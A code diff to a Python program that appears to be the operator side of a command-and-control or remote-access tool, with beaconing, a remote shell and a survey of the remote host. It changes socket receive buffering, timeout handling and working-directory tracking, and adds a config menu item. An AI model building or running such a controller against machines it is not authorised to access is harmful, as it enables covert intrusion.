@@ -239,7 +239,7 @@ def listen_for_data(conn, mode="print",encoding="b64"):
             print_info("Waiting for data...")
 
         recv_total = ""
-        recv_data = conn.recv(64).decode('utf-8')
+        recv_data = conn.recv(128).decode('utf-8')
         if encoding == "b64":
             recv_total = base64_decode(recv_data)
         else:
@@ -250,14 +250,18 @@ def listen_for_data(conn, mode="print",encoding="b64"):
                 recv_total = recv_total + base64_decode(recv_data)
             else:
                 recv_total = recv_total + recv_data
-            recv_data = conn.recv(64).decode('utf-8')
+            recv_data = conn.recv(128).decode('utf-8')
         if mode != "print":
             return recv_total[:-5]
         else:
             print(WHITE + recv_total[:-5] + RSTCOLORS)
     except socket.timeout:
         print("TIMEOUT")
-        print(recv_total[:-5])
+        if mode != "print":
+            return recv_total[:-5]
+        else:
+            print(WHITE + recv_total[:-5] + RSTCOLORS)
+
     except Exception as e:
         print(exc_info())
         print(e)
@@ -327,7 +331,8 @@ def run_initial_survey(conn):
         except socket.timeout:
             time = "UNK - TIMEOUT"
         try:
-            get_working_dir(conn)
+            cwd = get_working_dir(conn)
+            CURRENT_WORKING_DIR = cwd
         except socket.timeout:
             CURRENT_WORKING_DIR = "UNK - TIMEOUT"
         try:
@@ -372,9 +377,10 @@ def get_uuid(conn):
         return uuid
 
 def get_working_dir(conn):
-    global CURRENT_WORKING_DIR
     send_data(conn, "[pwd]")
-    CURRENT_WORKING_DIR = listen_for_data(conn,'store')
+    cwd = listen_for_data(conn,'store')
+    print(cwd)
+    return cwd
 
 def change_working_dir(conn, path):
     global CURRENT_WORKING_DIR
@@ -418,7 +424,8 @@ def listen():
     7 - Print Working Directory
     survey - run the initial survey
     shell - Start a Shell
-    beacon - Change Beacon Settings"""
+    beacon - Change Beacon Settings
+    print config - print some global settings"""
 
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     #context.verify_mode = ssl.CERT_REQUIRED
